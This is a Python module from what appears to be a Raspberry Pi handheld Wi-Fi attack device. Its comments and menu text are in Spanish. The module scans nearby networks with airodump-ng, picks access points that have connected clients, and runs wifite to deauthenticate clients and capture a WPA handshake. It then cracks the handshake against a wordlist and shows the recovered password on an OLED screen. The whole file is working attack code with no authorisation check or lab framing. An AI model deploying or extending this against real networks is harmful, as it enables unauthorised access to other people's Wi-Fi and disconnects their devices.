# modules/attack_handshake.py
import os
import re
import signal
import subprocess
import time
import queue
import threading
import RPi.GPIO as GPIO

import config
from gui import oled_menu

# Archivo de palabras clave (Wordlist)
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
WORDLIST_PATH = os.path.join(CURRENT_DIR, "wordlist.txt")

def clean_ansi(text):
    """Elimina códigos de escape ANSI (colores de terminal)."""
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)

def enqueue_output(out, q):
    """Hilo secundario para leer la salida de subprocesos sin bloquear la UI."""
    for line in iter(out.readline, ''):
        q.put(line)
    out.close()

def get_targets():
    """Escanea el entorno local y extrae objetivos detectados."""
    oled_menu.show_message("ESCANEANDO...", "Buscando objetivos", "Espere un momento")
    
    # Limpieza previa de temporales
    subprocess.run("sudo rm -f /tmp/scan_handshake*", shell=True, stderr=subprocess.DEVNULL)
    
    cmd = f"sudo timeout 15 airodump-ng {config.INTERFACE} --write /tmp/scan_handshake --output-format csv"
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    redes = []
    scan_file = "/tmp/scan_handshake-01.csv"
    
    if os.path.exists(scan_file):
        try:
            with open(scan_file, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
                parts = content.split("Station MAC")
                ap_lines = parts[0].split("\n")
                
                clients = []
                if len(parts) > 1:
                    clients = [l.split(",")[5].strip() for l in parts[1].split("\n") if len(l.split(",")) > 5]
                
                for line in ap_lines:
                    row = line.split(",")
                    if len(row) > 13 and ":" in row[0] and "BSSID" not in row[0]:
                        bssid = row[0].strip()
                        ssid = row[13].strip() or "Oculta"
                        # Priorizar objetivos con clientes activos
                        if bssid in clients:
                            redes.append({"ssid": ssid, "bssid": bssid, "ch": row[3].strip()})
        except Exception as e:
            print(f"[!] Error leyendo captura: {e}")
            
    return redes

def run_wifite_handshake(target_bssid):
    """Ejecuta el proceso secundario de captura."""
    cmd = [
        "sudo", "wifite",
        "-i", config.INTERFACE,
        "-b", target_bssid,
        "--no-pmkid",
        "--dict", WORDLIST_PATH,
        "--kill",
        "--new-hs"
    ]
    return subprocess.Popen(
        cmd, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.STDOUT, 
        text=True, 
        preexec_fn=os.setsid
    )

def stop_process(proc):
    """Termina de forma segura un grupo de procesos."""
    if proc and proc.poll() is None:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except Exception:
            pass

def start_handshake_attack_loop():
    """Bucle principal del módulo Handshake con UI normalizada."""
    if not config.INTERFACE:
        oled_menu.show_message("ERROR INTERFAZ", "No hay tarjeta", "en modo monitor")
        time.sleep(2)
        return

    wifi_list = get_targets()
    
    items_menu = ["<- VOLVER"]
    if wifi_list:
        items_menu += [f"{red['ssid']}" for red in wifi_list]
    else:
        items_menu.append("Sin clientes activos")

    estado = "LISTA"
    index = 0
    wifite_proc = None
    out_queue = None
    clave_final = ""
    target = None

    try:
        while True:
            # --- ESTADO 1: MENÚ DE SELECCIÓN ---
            if estado == "LISTA":
                oled_menu.draw_menu("HANDSHAKE (WIFITE)", items_menu, index)

                if GPIO.input(config.BTN_UP) == GPIO.LOW:
                    index = (index - 1) % len(items_menu)
                    time.sleep(0.2)
                elif GPIO.input(config.BTN_DOWN) == GPIO.LOW:
                    index = (index + 1) % len(items_menu)
                    time.sleep(0.2)
                elif GPIO.input(config.BTN_SELECT) == GPIO.LOW:
                    time.sleep(0.3)
                    
                    if index == 0:
                        return
                    
                    if wifi_list and index <= len(wifi_list):
                        target = wifi_list[index - 1]
                        clave_final = ""
                        oled_menu.show_message("INICIANDO...", target['ssid'], "Esperando EAPOL...")
                        
                        wifite_proc = run_wifite_handshake(target['bssid'])
                        
                        # Cola e Hilo no bloqueante
                        out_queue = queue.Queue()
                        t = threading.Thread(target=enqueue_output, args=(wifite_proc.stdout, out_queue))
                        t.daemon = True
                        t.start()
                        
                        estado = "ATACANDO"
                        time.sleep(0.5)

            # --- ESTADO 2: PROCESAMIENTO ASÍNCRONO ---
            elif estado == "ATACANDO":
                # Procesar mensajes de la cola sin congelar los botones
                try:
                    line = out_queue.get_nowait()
                    line_clean = clean_ansi(line.strip())
                    
                    if "Deauthenticating" in line_clean:
                        oled_menu.show_message("EN PROGRESO", "Enviando Deauth", target['ssid'][:14])
                    elif "Handshake captured" in line_clean:
                        oled_menu.show_message("¡CAPTURADO!", "Verificando PSK...", "Espere...")
                    
                    if "PSK (password):" in line_clean:
                        clave_final = line_clean.split("password):")[1].strip()
                    elif "Cracked WPA Handshake PSK:" in line_clean:
                        clave_final = line_clean.split("PSK:")[1].strip()

                    if any(k in line_clean for k in ["Finished", "exiting", "Quitting"]):
                        stop_process(wifite_proc)
                        estado = "RESULTADO"

                except queue.Empty:
                    pass

                # Cancelación manual por botón
                if GPIO.input(config.BTN_SELECT) == GPIO.LOW:
                    stop_process(wifite_proc)
                    oled_menu.show_message("CANCELADO", "Proceso detenido", "por usuario")
                    time.sleep(1.5)
                    return

            # --- ESTADO 3: PANTALLA DE RESULTADOS ---
            elif estado == "RESULTADO":
                oled_menu.clear_screen()
                oled_menu.draw.text((0, 0), f"RED: {target['ssid'][:14]}", font=oled_menu.font, fill=255)
                
                if clave_final:
                    oled_menu.draw_wrapped_text(f"KEY: {clave_final}", 16)
                else:
                    oled_menu.draw.text((0, 20), "Resultado: No hallada", font=oled_menu.font, fill=255)
                    
                oled_menu.draw.text((0, 50), "SELECT: Volver", font=oled_menu.font, fill=255)
                oled_menu.refresh()

                if GPIO.input(config.BTN_SELECT) == GPIO.LOW:
                    time.sleep(0.3)
                    return

            time.sleep(0.05)

    finally:
        stop_process(wifite_proc)
